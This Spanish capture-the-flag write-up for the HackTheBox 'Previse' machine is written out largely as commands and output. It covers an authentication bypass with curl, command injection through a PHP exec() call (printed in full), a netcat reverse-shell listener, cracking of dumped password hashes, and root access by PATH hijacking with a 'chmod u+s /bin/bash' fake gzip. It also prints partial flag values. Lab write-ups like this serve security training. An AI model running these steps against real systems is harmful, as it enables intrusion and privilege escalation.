---
title: "Previse - HTB Writeup"
layout: single
excerpt: "Previse es una máquina de dificultad fácil de la plataforma de HackTheBox. En esta máquina nos aprovechamos de una mala implementación de la función exec() de PHP para conseguir acceso inicial. Para ganar privilegios máximos, abusamos de un path hijacking en toda regla."
show_date: true
classes: wide
header:
  teaser: https://user-images.githubusercontent.com/67548295/147489706-e7f92a31-28ea-4472-ae42-8ac0c065b26b.png
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - PHP
  - Misconfiguration
  - Path Hijacking
  - Linux
---

![image](https://user-images.githubusercontent.com/67548295/147489612-7d91bd1a-71f2-45bd-95c0-f0ff21c41193.png)

# Enumeración

Empezamos la fase de enumeración enviando una paquete [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet){:target="\_blank"}{:rel="noopener nofollow"} a la máquina víctima con la herramienta `ping`, con esto veremos su estado y su **sistema operativo**:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ping -c 1 10.10.11.104
PING 10.10.11.104 (10.10.11.104) 56(84) bytes of data.
64 bytes from 10.10.11.104: icmp_seq=1 ttl=63 time=70.4 ms

--- 10.10.11.104 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 70.358/70.358/70.358/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está **activa** y que observando el `TTL`, concluimos que es una máquina **Linux**.

Más información sobre la **detección de OS** mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

## Nmap

Comenzamos con la fase de enumeración de puertos haciendo uso de la herramienta `nmap`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ sudo nmap -p- --open -sS --min-rate 4000 -n 10.10.11.104 -sC -sV -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-27 16:55 WET
Nmap scan report for 10.10.11.104
Host is up (0.069s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.25 seconds
```

| Parámetro | Acción |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

Observamos 2 puertos abiertos: 

| Puerto | Servicio |
|:------:|:--------:|
| 22 | Corresponde al protocolo [SSH](https://www.hostinger.es/tutoriales/que-es-ssh){:target="\_blank"}{:rel="noopener nofollow"} |
| 80 | Este puerto pertenece al protocolo [HTTP](https://www.pickaweb.es/ayuda/que-es-http/){:target="\_blank"}{:rel="noopener nofollow"} |

# User.txt

Enumeramos un poco el servidor web alojado en el puerto `80` con ayuda de `whatweb`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ whatweb http://10.10.11.104
http://10.10.11.104 [302 Found] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)] 
IP[10.10.11.104], Meta-Author[m4lwhere], RedirectLocation[login.php], Script, Title[Previse Home]
```
Por ahora nada relevante.

Visitemos el sitio web con el navegador:

![image](https://user-images.githubusercontent.com/67548295/147493399-90c84b6e-b407-49b4-8c17-dc02b1581861.png)

Vemos un panel de inicio de sesión.

Aquí pruebo credenciales comunes como `admin:admin` y `admin:password` pero no conseguimos acceder.

También pruebo a introducir comillas simples en ambos campos para verificar si es vulnerable a [SQL Injection](https://www.cloudflare.com/learning/security/threats/sql-injection/){:target="\_blank"}{:rel="noopener nofollow"}, pero tampoco es vulnerable.

Tras ver esto, pruebo a _fuzzear_ el servidor web en busca de directorios y recursos:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ gobuster dir -u http://10.10.11.104 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 75 -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.104
[+] Method:                  GET
[+] Threads:                 75
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/12/27 17:21:06 Starting gobuster in directory enumeration mode
===============================================================
/files.php            (Status: 302) [Size: 4914] [--> login.php]
/header.php           (Status: 200) [Size: 980]                 
/nav.php              (Status: 200) [Size: 1248]                
/footer.php           (Status: 200) [Size: 217]                 
/login.php            (Status: 200) [Size: 2224]                
/download.php         (Status: 302) [Size: 0] [--> login.php]   
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/status.php           (Status: 302) [Size: 2968] [--> login.php]              
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/] 
/logout.php           (Status: 302) [Size: 0] [--> login.php]                 
/index.php            (Status: 302) [Size: 2801] [--> login.php]              
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]              
/config.php           (Status: 200) [Size: 0]                                 
/logs.php             (Status: 302) [Size: 0] [--> login.php]                 
Progress: 69534 / 441096 (15.76%)    
```

| Parámetro | Acción |
|:---------:|:------:|
| `dir` | Establecemos que queremos usar el modo de enumeración de directorios y archivos |
| `-u` | Este parámetro sirve para indicar la URL donde se trabajará |
| `-w` | Especificamos la ruta del diccionario con el cual se _fuzzeará_ |
| `-t` | Este parámetro se usa para especificar la cantidad de hilos simultaneos |
| `-x` | Establecemos una lista de extensiones de archivo para _fuzzear_ |

Podemos ver que se nos reportan varios recursos `PHP` con un código de estado `302 Found` que corresponde a una **redirección**, en este caso al panel de inicio de sesión.

Es resumen, si intentamos acceder al recurso `accounts.php` (por ejemplo), se nos redirijirá al panel de inicio de sesión.

Es posible _bypassear_ esta redirección con `burpsuite` o con herramienta `curl` simplemente.

Probemos a acceder con `curl` a `accounts.php`:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ curl -s http://10.10.11.104/accounts.php | html2text

    * Home
    * ACCOUNTS
          o CREATE_ACCOUNT
    * FILES
    * MANAGEMENT_MENU
          o WEBSITE_STATUS
          o LOG_DATA
    * LOG_OUT

***** Add New Account *****
Create new user.
ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!
Usernames and passwords must be between 5 and 32 characters!
 [username            ]
 [********************]
 [********************]
CREATE USER
Created_by_m4lwhere
```

| Parámetro | Acción |
|:---------:|:------:|
| `-s, --silent` | Parámetro utilizado para silenciar errores y barras de progreso |

¡Perfecto! Parece ser que estamos accediendo a un area restringida donde podemos crear un usuario.

Inspeccionemos los atributos [id](https://developer.mozilla.org/es/docs/Web/HTML/Global_attributes/id){:target="\_blank"}{:rel="noopener nofollow"} de los campos de usuario y contraseña para poder crear un usuario:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl -s http://10.10.11.104/accounts.php

<!DOCTYPE html>

[...]

        <form role="form" method="post" action="accounts.php">
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: user"></span>
                    <input type="text" name="username" class="uk-input" id="username" placeholder="Username">
                </div>
            </div>
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: lock"></span>
                    <input type="password" name="password" class="uk-input" id="password" placeholder="Password">
                </div>
            </div>
            <div class="uk-margin">
                <div class="uk-inline">
                    <span class="uk-form-icon" uk-icon="icon: lock"></span>
                    <input type="password" name="confirm" class="uk-input" id="confirm" placeholder="Confirm Password">
                </div>
            </div>
            <button type="submit" name="submit" class="uk-button uk-button-default">CREATE USER</button>
        </form>
    </div>
</section>
            
[...]

</html>
```

Como vemos, hay 3 atributos `id`, uno con nombre `username`, donde introduciremos el usuario, otro con nombre `password`, donde introduciremos la contraseña, luego otro llamado `confirm`, donde tendremos que introducir de nuevo la contraseña para **confirmar**, y por último `submit`, que tendremos que dejar vacío.

Todos estos datos tendremos que enviarlos al servidor con el método [POST](https://developer.mozilla.org/es/docs/Web/HTTP/Methods/POST){:target="\_blank"}{:rel="noopener nofollow"}. Esto perfectamente se puede hacer con `curl` asi que ¡probemos!:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ curl -s -X POST http://10.10.11.104/accounts.php -d "username=usuario123&password=password123&confirm=password123&submit=" | html2text

    * Home
    * ACCOUNTS
          o CREATE_ACCOUNT
    * FILES
    * MANAGEMENT_MENU
          o WEBSITE_STATUS
          o LOG_DATA
    * LOG_OUT

***** Add New Account *****
Create new user.
ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!
Usernames and passwords must be between 5 and 32 characters!
Success! User was added!
 [username            ]
 [********************]
 [********************]
CREATE USER
Created_by_m4lwhere
```

| Parámetro | Acción |
|:---------:|:------:|
| `-s, --silent` | Parámetro utilizado para silenciar errores y barras de progreso |
| `-d, --data` | Este parámetro sirve para enviar datos en peticiones POST |

Cada parámetro tiene que ir separado del otro con un **ampersand** (&).

¡Hemos tenido éxito! Probemos ahora a iniciar sesión.

![image](https://user-images.githubusercontent.com/67548295/147691897-88bdc1f8-8b55-4ff9-ade8-c0955a0f09c4.png)

Inicio de sesión correcto :)

---

Investigando las funciones del sitio web estando autenticado, me encuentro con un supuesto **backup** de la web:

![image](https://user-images.githubusercontent.com/67548295/147692135-6f38f02e-f5b9-42e5-8581-5cfe81a1ac91.png)

Al descargarlo y descomprimirlo en mi equípo veo que están todos archivos de los recursos disponibles en el servidor web:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/siteBackup]
└──╼ $ ls -l
total 60
-rw-r--r-- 1 z3r0byte z3r0byte 5689 jun 12  2021 accounts.php
-rw-r--r-- 1 z3r0byte z3r0byte  208 jun 12  2021 config.php
-rw-r--r-- 1 z3r0byte z3r0byte 1562 jun  9  2021 download.php
-rw-r--r-- 1 z3r0byte z3r0byte 1191 jun 12  2021 file_logs.php
-rw-r--r-- 1 z3r0byte z3r0byte 6107 jun  9  2021 files.php
-rw-r--r-- 1 z3r0byte z3r0byte  217 jun  3  2021 footer.php
-rw-r--r-- 1 z3r0byte z3r0byte 1012 jun  6  2021 header.php
-rw-r--r-- 1 z3r0byte z3r0byte  551 jun  6  2021 index.php
-rw-r--r-- 1 z3r0byte z3r0byte 2967 jun 12  2021 login.php
-rw-r--r-- 1 z3r0byte z3r0byte  190 jun  8  2021 logout.php
-rw-r--r-- 1 z3r0byte z3r0byte 1174 jun  9  2021 logs.php
-rw-r--r-- 1 z3r0byte z3r0byte 1279 jun  5  2021 nav.php
-rw-r--r-- 1 z3r0byte z3r0byte 1900 jun  9  2021 status.php
```

Entre estos archivos encuentro 2 cosas interesantes:

##### 1º Credenciales en texto claro de MySQL

Al visualizar el archivo `config.php` me doy cuenta de que contiene **credenciales** en texto claro de **MySQL**:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/siteBackup]
└──╼ $cat config.php
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'XXXXXXXXXXXXXXXXXXX';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```
Guardo estas credenciales por si las necesitamos en el futuro.

##### 2º Función exec() peligrosa 

En el archivo `logs.php` se pude ver que se hace uso de la funcion `exec()` la cual **ejecuta comandos a nivel de sistema**.

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/siteBackup]
└──╼ $cat logs.php 

[...]

<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

[...]
?>
```
Se está ejecutando con `python` el script `/opt/scripts/log_proccess.py`, pasandole como argumento los datos enviados por **POST** del parámetro `delim`.

Antes de nada, veamos el recurso que maneja esto de los logs desde el navegador.

![image](https://user-images.githubusercontent.com/67548295/147695422-a7b6484c-68ab-4083-8a1d-85a9bf0117e9.png)

Parece ser en este recurso, `file_logs.php`, puedes elegir el delimitador con el que se guardarán los logs.

En la lista que nos ha aparecido, podemos elegir 3 tipos de delimitadores: comas, espacios o tabulaciones. Pero nosotros podemos introducir lo que queramos en este parámetro con herramientas simples como `curl`.

El **vector de explotación** reside aquí, ya que lo que introduzcamos como valor en el parámetro `delim` va a estar dentro de la función `exec()` y será ejecutado.

Con esto podríamos entablar una `reverse shell` entre la máquina víctima y mi equipo.

¡Probemos!

---

### Explotación

Tenemos que ver como se tramitan los datos al pulsar el botón de `submit`.

![image](https://user-images.githubusercontent.com/67548295/147696379-d7e4a034-206e-46e4-9f1b-3833ebd6cd0b.png)

Vemos que solo se tramita el parámetro `delim` bien, probemos a capturar una petición con `burpsuite` para cambiar el parámetro `delim` e introducir una instrucción que genere una **reverse shell**.

### 1º - Capturamos la petición con el burpsuite

Habilitamos el proxy en el navegador, clickamos en el botón de `submit` y capturamos la petición.

![image](https://user-images.githubusercontent.com/67548295/147698062-815ff65e-3bf0-44ee-a47e-332c1097c2ec.png)

### 2º - Enviamos la petición al _repeater_

Enviamos la petición capturada a la herramienta _repeater_ para trabajar mejor con ella.

![image](https://user-images.githubusercontent.com/67548295/147698244-2e16ab74-9c34-4cad-b1b7-3b95c3b5785e.png)

### 3º - Nos ponemos en escucha con NetCat

Nos ponemos en escucha por cualquier puerto para recibir la **reverse shell**.

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/siteBackup]
└──╼ $ nc -lvp 4444
Listening on 0.0.0.0 4444
```

| Parámetro | Acción |
|:---------:|:------:|
| `-l` | Habilita el modo escucha, para conexiones entrantes |
| `-v` | Este parámetro dice que queremos que nos reporte más información de lo normal |
| `-p` | Especificamos el puerto por el cual nos queremos poner en escucha, en mi caso el `4444` |

### 4º Enviamos la petición con la instrucción maliciosa

En el _repeater_, cambiamos el valor del parámetro `delim` e introducimos un payload de `reverse shell`, en mi caso usaré un payload de `nc`:

![image](https://user-images.githubusercontent.com/67548295/147699744-8ef9404e-2bda-452e-a78d-9b9f42acc259.png)

# 4º - Disfrutar la shell

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/siteBackup]
└──╼ $ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.104 53622
uname -a
Linux previse 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```
A partir de aquí, solamente habría que convertir esta `shell` en una [Fully interactive TTY](https://metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/){:target="\_blank"}{:rel="noopener nofollow"}.

---

Una vez dentro del sistema como el usuario `www-data`, visualizo el archivo `/etc/passwd` en busca de más usuarios.

```bash
www-data@previse:/$ grep -E 1[0-9]{3}  /etc/passwd | sed s/:/\ / | awk '{print $1}'
m4lwhere
```

Vemos que aparte de `root`, tenemos el usuario `m4lwhere`. Vendrá bien tenerlo en cuenta.

Me acuerdo de la credencial de `MySQL` que habíamos encontrado y miro si este software está activo en la máquina de forma interna:

```bash
www-data@previse:/$ netstat -nat | grep "127.0.0.1"
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN 
```
Vemos que si, está corriendo de forma interna ya que el puerto `3306` corresponde a `MySQL` por defecto.

Sabiendo esto, podemos iniciar sesión en `MySQL` con las credenciales encontradas.

```bash
www-data@previse:/$ mysql -u root -p 
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2063
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

¡Accedimos! Una vez aquí podemos navegar por las bases de datos disponibles.

Para listar las bases de datos, usamos el comando `show databases;`:

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
```
Me llama la atención la base de datos `previse`, ya que las demás son DB's genéricas.

Para seleccionar una base de datos donde trabajar usamos el comando `use nombre_de_la_DB;`

```bash
mysql> use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```
Ahora listemos las tablas en esta base de datos:

```bash
mysql> show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)
```
Mmmh, tenemos una tabla con nombre `accounts`, no me extrañaría que se guardaran **usuarios y contraseñas** aquí.

Usemos el comando `describe nombre_tabla;` para ver las columnas de la tabla `accounts`:

```bash
mysql> describe accounts;
+------------+--------------+------+-----+-------------------+----------------+
| Field      | Type         | Null | Key | Default           | Extra          |
+------------+--------------+------+-----+-------------------+----------------+
| id         | int(11)      | NO   | PRI | NULL              | auto_increment |
| username   | varchar(50)  | NO   | UNI | NULL              |                |
| password   | varchar(255) | NO   |     | NULL              |                |
| created_at | datetime     | YES  |     | CURRENT_TIMESTAMP |                |
+------------+--------------+------+-----+-------------------+----------------+
4 rows in set (0.00 sec)
```
Tenemos un campo `username` y un campo `password`

Veamos que hay aquí:

```bash
mysql> SELECT username,password FROM accounts;
+----------------+------------------------------------+
| username       | password                           |
+----------------+------------------------------------+
| m4lwhere       | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. |
| usuario123     | $1$🧂llol$DJ6ZVzF0zBGjTIV/GTvOf/ |
+----------------+------------------------------------+
10 rows in set (0.00 sec)
```
Podemos observar el `hash` del usuario `m4lwhere` el cual es un poco raro.

Metemos el hash en un archivo de texto y probamos a romperlo con `hashcat`:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $hashcat -a 0 -m 500 hash.txt /usr/share/wordlists/rockyou.txt --potfile-disable
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-7200U CPU @ 2.50GHz, 2772/2836 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

[...]

$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:XXXXXXXXXXXXXXXXXXXXXXXX
                                                 
[...]
```
¡Hemos _crackeado_ el hash!, tenemos una contraseña.

Probemos a conectarnos por **SSH** como el usuario `m4lwhere` proporcionando esta contraseña:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ ssh m4lwhere@10.10.11.104
m4lwhere@10.10.11.104's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Dec 29 21:40:18 UTC 2021

  System load:  0.0               Processes:           200
  Usage of /:   49.7% of 4.85GB   Users logged in:     1
  Memory usage: 23%               IP address for eth0: 10.10.11.104
  Swap usage:   0%


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Dec 29 21:33:55 2021 from 10.10.14.150
m4lwhere@previse:~$ 
```
¡Perfecto!, una vez en este punto, es posible visualizar la flag `user.txt` localizada en `/home/m4lwhere/user.txt`:

```bash
m4lwhere@previse:~$ head --bytes 10 /home/m4lwhere/user.txt | xargs
0d10597dab
```
# Root.txt

Enumero los permisos de `sudo` del usuario `m4lwhere` y me encuentro con lo siguiente:

```bash
m4lwhere@previse:~$ sudo -l 
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```
Podemos ejecutar como usuario `root` el archivo `/opt/scripts/access_backup.sh`.

Veamos que contiene este archivo:

```bash
m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh 
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```
Bien, viendo a simple vista el archivo me doy cuenta de que se está haciendo uso del comando `gzip`.

Pero hay un problema, se está llamando a este comando de **forma relativa** y no de **forma absoluta**. Con esto me refiero a que se está llamando haciendo uso de la variable de entorno `PATH`, la cual contiene rutas donde se almacenan binarios. Y no de forma absoluta, colocando la ruta completa del comando, por ejemplo `/bin/gzip`.

Esto hace que este script sea vulnerable a un [Path hijacking](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/){:target="\_blank"}{:rel="noopener nofollow"}.

Este ataque consiste en crear un archivo que se llame igual que el **comando** que es llamado de **forma relativa**, para luego añadir su ruta en la variable de entorno `PATH` y que a la hora de llamar al comando haga match con nuestro **archivo malicioso** en lugar de con el comando legítimo.

Se entenderá mejor en la práctica, explotemos esto.

#### 1º - Crear el archivo malicioso

Vamos a la ruta `/tmp` (por ejemplo), creamos un archivo con nombre `gzip` y dentro escribimos un script en bash que asigne permisos SUID a `/bin/bash`

```bash
m4lwhere@previse:~$ cd /tmp
m4lwhere@previse:/tmp$ touch gzip
m4lwhere@previse:/tmp$ echo "chmod u+s /bin/bash" > gzip
m4lwhere@previse:/tmp$ chmod +x gzip
```

#### 2º - Añadimos la ruta /tmp a PATH

Ahora tendremos que añadir la ruta `/tmp` a la variable de entorno `PATH`:

```bash
m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH
```

#### 3º - Ejecutar script

Una vez hemos hecho lo anterior, solo queda **ejecutar el script**:

```bash
m4lwhere@previse:/tmp$ sudo -u root /opt/scripts/access_backup.sh 
[sudo] password for m4lwhere: 
```

#### 4º - Acceder como usuario root

Ahora si miramos los permisos de `/bin/bash` veremos que es un binario `SUID`:

```bash
m4lwhere@previse:/tmp$ ls -la /bin/bash 
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```
Notese la '`s`' en los permisos.

Ahora para acceder como `root`, es tan fácil como ejecutar el comando `bash -p`:

```bash
m4lwhere@previse:~$ bash -p
bash-4.4# id
uid=1000(m4lwhere) gid=1000(m4lwhere) euid=0(root) egid=0(root) groups=0(root),1000(m4lwhere)
```

Una vez en este punto, podemos ver la flag `root.txt` en la ruta `/root/root.txt`

```bash
bash-4.4# head --bytes 10 /root/root.txt | xargs
3c2d7b6a42
```

# Conclusión

En esta maquina hemos conseguido un **acceso inicial** aprovechandonos de una mala implementación de la función `exec()` de `PHP`.
Para escalar privilegios hemos abusado de un path hijacking para acceder como root.


